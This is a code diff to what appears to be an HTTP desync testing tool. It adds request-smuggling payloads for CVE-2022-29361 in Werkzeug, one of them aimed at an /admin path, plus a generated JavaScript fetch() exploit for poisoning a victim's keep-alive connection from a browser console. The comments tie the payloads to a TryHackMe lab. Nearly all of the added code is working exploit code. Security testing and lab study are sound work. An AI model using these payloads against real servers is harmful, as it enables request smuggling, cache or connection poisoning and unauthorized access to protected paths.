@@ -114,7 +114,91 @@ class ClientSideDesyncPayloadGenerator(PayloadGenerator):
             },
         ))
         
+        # CVE-2022-29361: Werkzeug browser desync (keep-alive poisoning)
+        # Werkzeug v2.1.0 with threaded=True allows keep-alive connections
+        # The desync occurs when a malformed request body poisons the queue
+        # This matches the TryHackMe attack pattern exactly
+        smuggled_request = "GET /redirect HTTP/1.1\r\nFoo: x"
+        werkzeug_payload = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Connection: keep-alive\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: {len(smuggled_request)}\r\n"
+            f"\r\n"
+            f"{smuggled_request}"
+        )
+        
+        payloads.append(Payload(
+            name="CSD-werkzeug-desync",
+            variant=self.variant,
+            category=PayloadCategory.TIMING,
+            raw_request=werkzeug_payload.encode(),
+            description="CVE-2022-29361 Werkzeug browser desync via keep-alive poisoning",
+            detection_method=DetectionMethod.TIMING,
+            expected_behavior="Next request on same connection gets redirected to /redirect (404)",
+            expected_timeout=5.0,
+            metadata={
+                "attack_type": "werkzeug_desync",
+                "cve": "CVE-2022-29361",
+                "affected_versions": "Werkzeug <= 2.1.0",
+                "requires_keepalive": True,
+                "js_exploit": self._generate_werkzeug_js_exploit(origin, path),
+            },
+        ))
+        
+        # Werkzeug variant 2: Various Content-Length mismatches
+        # Some servers handle CL differently, test with embedded GET
+        werkzeug_payload2 = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Connection: keep-alive\r\n"
+            f"Content-Length: 50\r\n"
+            f"\r\n"
+            f"GET /admin HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"X-Ignore: "
+        )
+        
+        payloads.append(Payload(
+            name="CSD-werkzeug-admin",
+            variant=self.variant,
+            category=PayloadCategory.TIMING,
+            raw_request=werkzeug_payload2.encode(),
+            description="CVE-2022-29361 Werkzeug desync targeting /admin",
+            detection_method=DetectionMethod.TIMING,
+            expected_behavior="Next request sees /admin response",
+            expected_timeout=5.0,
+            metadata={
+                "attack_type": "werkzeug_desync",
+                "cve": "CVE-2022-29361",
+                "target_path": "/admin",
+            },
+        ))
+        
         return payloads
+    
+    def _generate_werkzeug_js_exploit(self, origin: str, path: str) -> str:
+        """Generate JavaScript exploit for CVE-2022-29361 Werkzeug desync.
+        
+        This is the exact pattern used in the TryHackMe room.
+        """
+        return f'''
+// CVE-2022-29361 Werkzeug Browser Desync Exploit
+// Run this in browser console targeting a vulnerable Werkzeug server
+fetch('{origin}{path}', {{
+    method: 'POST',
+    body: 'GET /redirect HTTP/1.1\\r\\nFoo: x',
+    mode: 'cors',
+}}).then(() => {{
+    // Connection is now poisoned
+    // Refresh page to see the desync effect (404 from /redirect)
+    console.log('Connection poisoned - refresh to trigger desync');
+}}).catch(e => {{
+    // CORS error expected but request still sent
+    console.log('Request sent (CORS error expected):', e);
+}});
+'''
     
     def generate_differential_payloads(self, endpoint: Endpoint) -> List[Payload]:
         """Generate CSD differential detection payloads.
